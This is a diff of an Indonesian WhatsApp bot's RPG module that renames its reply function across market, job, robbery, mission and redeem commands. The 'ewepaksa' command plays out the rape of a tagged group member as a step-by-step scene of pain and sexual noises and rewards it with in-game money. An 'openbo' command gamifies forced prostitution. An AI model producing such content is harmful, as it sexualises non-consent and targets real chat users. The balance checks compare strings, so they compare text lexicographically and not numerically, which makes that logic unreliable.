+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].cumi += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Cumi: ${args[1]}
@@ -21736,14 +21709,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'buntal': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].buntal += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Buntal: ${args[1]}
@@ -21757,14 +21730,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'dory': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 7000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].dory += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Dory: ${args[1]}
@@ -21778,14 +21751,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'lumba': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 674000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].lumba += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Lumba": ${args[1]}
@@ -21799,14 +21772,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'lobster': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 3000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].lobster += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Lobster: ${args[1]}
@@ -21820,14 +21793,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'hiu': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 8750000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].hiu += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Hiu: ${args[1]}
@@ -21841,14 +21814,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'udang': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].udang += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Udang: ${args[1]}
@@ -21862,14 +21835,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'orca': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 12000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].orca += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Orca: ${args[1]}
@@ -21883,14 +21856,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'potion': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].potion += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Potion: ${args[1]}
@@ -21989,8 +21962,8 @@ Tutorials :
     case 'bekerja':
     case 'kerja': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let type = (args[0] || '').toLowerCase()
       let time = global.db.erpg[m.sender].lastkerja + 600000
       let __timers = (new Date - global.db.erpg[m.sender].lastkerja)
@@ -22011,49 +21984,49 @@ Tutorials :
 
       switch (type) {
       case 'ojek':
-        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
+        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return replyV1(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
         let hasilojek = Math.floor(Math.random() * 10000)
-        Reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} 💰*`).then(() => {
+        replyV1(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} 💰*`).then(() => {
           db.users[m.sender].saldo += hasilojek
           global.db.erpg[m.sender].lastkerja = new Date * 1
         })
         break
       case 'pedagang':
-        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
+        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return replyV1(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
         let hasildagang = Math.floor(Math.random() * 10000)
-        Reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} 💰*`).then(() => {
+        replyV1(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} 💰*`).then(() => {
           db.users[m.sender].saldo += hasildagang
           global.db.erpg[m.sender].lastkerja = new Date * 1
         })
         break
       case 'dokter':
-        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
+        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return replyV1(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
         let hasildokter = Math.floor(Math.random() * 10000)
-        Reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* 💰`).then(() => {
+        replyV1(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* 💰`).then(() => {
           db.users[m.sender].saldo += hasildokter
           global.db.erpg[m.sender].lastkerja = new Date * 1
         })
         break
       case 'petani':
-        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
+        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return replyV1(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
         let hasiltani = Math.floor(Math.random() * 10000)
-        Reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} 💰*`).then(() => {
+        replyV1(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} 💰*`).then(() => {
           db.users[m.sender].saldo += hasiltani
           global.db.erpg[m.sender].lastkerja = new Date * 1
         })
         break
       case 'montir':
-        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
+        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return replyV1(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
         let hasilmontir = Math.floor(Math.random() * 10000)
-        Reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* 💰`).then(() => {
+        replyV1(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* 💰`).then(() => {
           db.users[m.sender].saldo += hasilmontir
           global.db.erpg[m.sender].lastkerja = new Date * 1
         })
         break
       case 'kuli':
-        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
+        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return replyV1(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
         let hasilkuli = Math.floor(Math.random() * 10000)
-        Reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} 💰*`).then(() => {
+        replyV1(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} 💰*`).then(() => {
           db.users[m.sender].saldo += hasilkuli
           global.db.erpg[m.sender].lastkerja = new Date * 1
         })
@@ -22103,46 +22076,46 @@ ${command} kuli`
     case 'merampok':
     case 'rampok': {
 
-      if (!m.isGroup) return Reply(mess.group || 'Command ini hanya bisa digunakan di grup.')
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!m.isGroup) return replyV1(mess.group || 'Command ini hanya bisa digunakan di grup.')
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let hasil = (Math.floor(Math.random() * 5000))
       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-      if (!m.mentionedJid[0] && !m.quoted && !text) return Reply(`*Tag/Reply Target!*\n\nContoh :\n${command} @0`)
-      if (users == m.sender) return Reply("Gak bisa ngerampok diri sendiri")
+      if (!m.mentionedJid[0] && !m.quoted && !text) return replyV1(`*Tag/Reply Target!*\n\nContoh :\n${command} @0`)
+      if (users == m.sender) return replyV1("Gak bisa ngerampok diri sendiri")
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastrampok)
-      if (new Date() - global.db.erpg[m.sender].lastrampok < 3600000) return Reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
-      if (db.users[users].saldo < 5000) return Reply("Target kismin")
+      if (new Date() - global.db.erpg[m.sender].lastrampok < 3600000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
+      if (db.users[users].saldo < 5000) return replyV1("Target kismin")
       db.users[users].saldo -= hasil * 1
       db.users[m.sender].saldo += hasil * 1
       global.db.erpg[m.sender].lastrampok = new Date * 1
-      Reply(`Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
+      replyV1(`Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
     }
     break
 
     case 'ewepaksa':
     case 'ewe-paksa': {
 
-      if (!m.isGroup) return Reply(mess.group || 'Command ini hanya bisa digunakan di grup.')
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!m.isGroup) return replyV1(mess.group || 'Command ini hanya bisa digunakan di grup.')
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-      if (!m.mentionedJid[0] && !m.quoted && !text) return Reply(`*Tag/Reply Target!*\n\nContoh :\n${command} @0`)
+      if (!m.mentionedJid[0] && !m.quoted && !text) return replyV1(`*Tag/Reply Target!*\n\nContoh :\n${command} @0`)
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastewe)
-      if (new Date() - global.db.erpg[m.sender].lastewe < 43200000) return Reply(`Kamu Baru Saja ngwe, ${waktuu} Yang Lalu, ewe Lagi nanti.`)
+      if (new Date() - global.db.erpg[m.sender].lastewe < 43200000) return replyV1(`Kamu Baru Saja ngwe, ${waktuu} Yang Lalu, ewe Lagi nanti.`)
       let uang = await randomNomor(3000, 19000)
       let exp = await randomNomor(3444, 7897)
-      Reply(`kamu membawa nya ke kamar dan membuka paksa baju nya...`)
+      replyV1(`kamu membawa nya ke kamar dan membuka paksa baju nya...`)
       await sleep(3000)
-      Reply(`Ehh Mau Ngapainn 😣😣...`)
+      replyV1(`Ehh Mau Ngapainn 😣😣...`)
       await sleep(3000)
-      Reply(`Ahhh Pelan Pelann, Sakittt😖😖😖....\nAHHH...AHHHH...Pelan Pelan...😖😖😖`)
+      replyV1(`Ahhh Pelan Pelann, Sakittt😖😖😖....\nAHHH...AHHHH...Pelan Pelan...😖😖😖`)
       await sleep(3000)
-      Reply(`Ahhhh, Sakitttt!! >////<\nPlok...Plokkk...Plokkkk😩😖`)
+      replyV1(`Ahhhh, Sakitttt!! >////<\nPlok...Plokkk...Plokkkk😩😖`)
       await sleep(3000)
-      Reply(`😖Ahhhh.... Penuhhh.... Angettt😖`)
+      replyV1(`😖Ahhhh.... Penuhhh.... Angettt😖`)
       await sleep(3000)
-      Reply(`*—[ Hasil Ewe ${db.users[m.sender].nama} ]—* 
+      replyV1(`*—[ Hasil Ewe ${db.users[m.sender].nama} ]—* 
 ➤ 💰 Uang = [ ${uang} ] 
 ➤ ✨ Exp = [ ${exp} ] 
 ➤ 🎗️ Tugas Selesai = +1`)
@@ -22155,10 +22128,10 @@ ${command} kuli`
     case 'open-bo':
     case 'openbo': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastopenbo)
-      if (new Date() - global.db.erpg[m.sender].lastopenbo < 54000000) return Reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
+      if (new Date() - global.db.erpg[m.sender].lastopenbo < 54000000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
       let uwong = ['Azril', 'Amba', 'MarkZukbrg', 'Mulyono', 'Andree']
       let userpname = pickRandom(uwong)
       let hotel = await randomNomor(3, 6)
@@ -22166,15 +22139,15 @@ ${command} kuli`
       let expusr = await randomNomor(8000, 13000)
       let limit = await randomNomor(20, 80)
       let stamina = await randomNomor(45, 85)
-      Reply('Sedang Mencari Pelanggan...')
+      replyV1('Sedang Mencari Pelanggan...')
       await sleep(5000)
-      Reply(`Kamu Mendapatkan Pelanggan Bernama ${userpname} Dan Pergi Ke Hotel Bintang ${hotel}`)
+      replyV1(`Kamu Mendapatkan Pelanggan Bernama ${userpname} Dan Pergi Ke Hotel Bintang ${hotel}`)
       await sleep(4000)
-      Reply('Kamu Pun Mulai Melakukan Nganu Dengannya')
+      replyV1('Kamu Pun Mulai Melakukan Nganu Dengannya')
       await sleep(6000)
-      Reply('Kamu Di Paksa Untuk Melayaninya 24 Jam')
+      replyV1('Kamu Di Paksa Untuk Melayaninya 24 Jam')
       await sleep(4000)
-      Reply(`Kamu Terbaring Lemas Karna Melakukan\nNgentod 24 Jam Dengan ${userpname},\nTetapi Kamu Mendapatkan : \n
+      replyV1(`Kamu Terbaring Lemas Karna Melakukan\nNgentod 24 Jam Dengan ${userpname},\nTetapi Kamu Mendapatkan : \n
 Uang : ${uang}
 Exp : ${expusr}
 Limit : ${limit}
@@ -22191,23 +22164,23 @@ Stamina berkurang ${stamina}%`)
     case 'daily-misi':
     case 'dailymisi': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastdailymisi)
-      if (new Date() - global.db.erpg[m.sender].lastdailymisi < 86400000) return Reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
+      if (new Date() - global.db.erpg[m.sender].lastdailymisi < 86400000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
       let misiget = ['Menangkap 30 lalat dalam 30 detik', 'Ngentod Janda', 'Menangkap anomali', 'Menangkap Maling', 'Menangkap Buronan', 'Menangkap azril', 'Mengejar Ilham', 'Membunuh MarkZukberg', 'Membunuh Tuhan', 'Berburu Perawan']
       let mission = pickRandom(misiget)
       let uang = await randomNomor(7000, 34000)
       let expget = await randomNomor(8000, 13000)
       let limit = await randomNomor(20, 80)
       let stamina = await randomNomor(45, 85)
-      Reply('Mencari Misi...')
+      replyV1('Mencari Misi...')
       await sleep(3000)
-      Reply(`Misi ${mission} Berhasil Didapatkan`)
+      replyV1(`Misi ${mission} Berhasil Didapatkan`)
       await sleep(4000)
-      Reply('Mengerjakan misi...')
+      replyV1('Mengerjakan misi...')
       await sleep(10000)
-      Reply(`${conn.getName(m.sender)} Berhasil Menyelesaikan Misi
+      replyV1(`${conn.getName(m.sender)} Berhasil Menyelesaikan Misi
 Dan Kamu Mendapatkan :
 Uang : ${uang}
 Exp : ${expget}
@@ -22225,20 +22198,20 @@ Sramina Berkurang ${stamina}%`)
     case 'ngaji':
     case 'mengaji': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastngaji)
-      if (new Date() - global.db.erpg[m.sender].lastngaji < 14400000) return Reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
+      if (new Date() - global.db.erpg[m.sender].lastngaji < 14400000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
       let uang = randomNomor(3000, 6000)
       let expget = randomNomor(3000, 5000)
-      Reply('Mencari Guru Ngaji....')
+      replyV1('Mencari Guru Ngaji....')
       await sleep(7000)
-      Reply('Ketemu ustadz..')
+      replyV1('Ketemu ustadz..')
       await sleep(4000)
-      Reply('Diajarin tajwid')
+      replyV1('Diajarin tajwid')
       await sleep(3000)
-      Reply('Ngasih tau, kalo qalqalah itu dipantulkan')
+      replyV1('Ngasih tau, kalo qalqalah itu dipantulkan')
       await sleep(3000)
-      Reply(`*—[ Hasil Ngaji ]—*
+      replyV1(`*—[ Hasil Ngaji ]—*
 ➕💹 Uang jajan: ${uang}
 ➕✨ Exp: ${expget}
 ➕🤬 Dimarahin: -1`)
@@ -22251,8 +22224,8 @@ Sramina Berkurang ${stamina}%`)
     case 'skillcek':
     case 'cekskill': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      Reply(`${global.db.erpg[m.sender].skillselect ? `Skill kamu : ${global.db.erpg[m.sender].skillselect}` : 'Kamu Belum Memiliki Skill'}`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      replyV1(`${global.db.erpg[m.sender].skillselect ? `Skill kamu : ${global.db.erpg[m.sender].skillselect}` : 'Kamu Belum Memiliki Skill'}`)
     }
     break
 
@@ -22265,14 +22238,14 @@ db.redeem = db.redeem || {
         user: [],
         maxRedeem: 0
       }
-      if (!db.redeem.isRedeem) return Reply('Tidak ada redeem yang di berikan')
-      if (!text) return Reply('Masukan kode!')
+      if (!db.redeem.isRedeem) return replyV1('Tidak ada redeem yang di berikan')
+      if (!text) return replyV1('Masukan kode!')
       if (db.redeem.isRedeem) {
         let code = text.toLowerCase()
         let redeem = db.redeem.code.toLowerCase()
-        if (code !== redeem) return Reply('Kode kamu gak valid!')
-        if (db.redeem.maxRedeem < 1) return Reply('Kode udah abiss cokk')
-        if (db.redeem.user.includes(m.sender)) return Reply('Kamu sudah claim kode ini!')
+        if (code !== redeem) return replyV1('Kode kamu gak valid!')
+        if (db.redeem.maxRedeem < 1) return replyV1('Kode udah abiss cokk')
+        if (db.redeem.user.includes(m.sender)) return replyV1('Kamu sudah claim kode ini!')
         let uang = await randomNomor(100000, 3000000)
         let expgt = await randomNomor(3000, 8000)
         let limiter = await randomNomor(1000, 5000)
@@ -22290,7 +22263,7 @@ db.redeem = db.redeem || {
 -  ${expgt} Exp
 -  ${limiter} Limit
 -  ${glimiter} Game Limit`
-        Reply(teks)
+        replyV1(teks)
         if (db.redeem.maxRedeem < 1) {
           const exhaustedRedeemCode = db.redeem.code;
           setTimeout(() => {
@@ -22305,7 +22278,7 @@ db.redeem = db.redeem || {
           }, 10 * 60 * 1000);
         }
       } else {
-        Reply("*Gak ada redeem yang di berikan 😓*")
+        replyV1("*Gak ada redeem yang di berikan 😓*")
       }
     }
     break
@@ -22315,27 +22288,27 @@ db.redeem = db.redeem || {
     case 'redeemset':
     case 'setredeem': {
 
-if (!isOwner) return Reply(mess.owner || 'Command ini hanya bisa digunakan oleh owner.')
+if (!isOwner) return replyV1(mess.owner || 'Command ini hanya bisa digunakan oleh owner.')
       db.redeem = db.redeem || {
         isRedeem: false,
         code: "",
         user: [],
         maxRedeem: 0
       }
-      if (!args[0]) return Reply(`*Masukin Kode Redemnya!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
